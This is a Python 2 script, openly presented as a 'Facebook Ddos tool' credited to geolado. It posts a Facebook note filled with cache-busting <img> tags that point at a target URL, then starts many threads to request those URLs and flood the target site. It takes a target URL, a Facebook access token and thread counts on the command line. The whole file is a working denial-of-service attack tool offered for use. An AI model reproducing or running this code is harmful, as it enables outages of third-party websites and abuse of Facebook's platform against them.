'''
    Facebook Ddos tool
    based on : http://chr13.com/2014/04/20/using-facebook-notes-to-ddos-any-website
    by geolado | g3ol4d0

    Privacy !!

    need :  pip install facebook-sdk
            pip install eventlet

'''

import argparse , facebook , random , string , re , urllib2 , threading , eventlet , os , sys
from eventlet.green import urllib2

def banner() :
    screen = getTerminalSize()
    center_width = screen[1]
    banner_ascii = [ "___ ___   ___  ___      ___",
                    "| __| _ ) |   \|   \ ___/ __|",
                    "| _|| _ \ | |) | |) / _ \__ \ ",
                    "|_| |___/ |___/|___/\___/___/",
                     "FaceBook Note DDoS/0.1",
                     "by geolado | g3ol4d0"]
                 
    for line in banner_ascii :
        print line.center(center_width)     


def getTerminalSize():

    line = os.popen('stty size', 'r').read().split()
    line = map(int , line)

    return line 

def make_list(url,lines) :
    '''Make the list to post note'''

    list = []
    for i in xrange(lines) :
        list.append("<img src=\""+url+"?r="+str(i+1)+"\"></img>")
    return list 

def post_note(list_string,token) :
    '''Post the note on your FB'''

    print "[i] Posting note ..."
    print "[i] Using Token : {token}".format ( token = token )
    try :
        graph = facebook.GraphAPI(token)
    except :
        print "[!] Token error !"
        exit()  
    put = graph.put_object("me", "notes", subject="1111111" , message=list_string )

    put_id = put["id"]
    print "[i] Posted , id = {id} ".format( id = put_id )

    return put_id

def read_note(note_id,token) :
    '''get Note's message for the Ddos'''

    print "[i] Reading note ..."
    graph = facebook.GraphAPI(token)
    note = graph.get_object(note_id)

    return note["message"]

def thread(threads,urls) :
    '''Initiate the main thread , emulating one browser's tab'''

    print "[i] Initiating the main thread ..."

    for i in xrange(threads) :
        t = threading.Thread( target=sub_thread,args = [urls])
        t.start()
        sys.stdout.write('\r')
        sys.stdout.write("[i] Creating threads : "+str(i)+"/"+str(threads))

def sub_thread(urls) :
    '''Sub-thread for each requisition'''

    for u in urls :
        try :
            urllib2.urlopen(u)
        except urllib2.HTTPError , err :
            if err.code == 404 :
                print "[!] 404 Page not found !"
                exit()
            else :  
                print "[!] HTTP Error !"    
        except :
            print "[!] Connect Error !"     


def main() :
    print "[i] Making list of <img> to post"
    list = make_list(args.url,args.lines)
    list_string = ""

    for i in list :
        '''Make string of the list with \n to post'''
        list_string += i+"\n"

    post_note_id = post_note(list_string,args.token)    
    read_note_message = read_note(post_note_id,args.token)

    '''Regex to get links from message'''

    print "[i] Getting links from note"

    urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', read_note_message)

    thread(args.threads,urls)

if __name__ == "__main__" :

    banner()

    parser = argparse.ArgumentParser()

    parser.add_argument('-u', '--url', type=str, help='URL To attack',required=True)
    parser.add_argument('-t', '--token', type=str, help='Access token provided by FaceBook to your account ( see README.txt to how get it )',required=True)
    parser.add_argument('-l', '--lines', default=1000 , type=int, help='Number of lines on FaceBook note')
    parser.add_argument('--threads', type=int, help='Number of threads to request from FaceBook' , required=True )


    args = parser.parse_args()
    
    main()


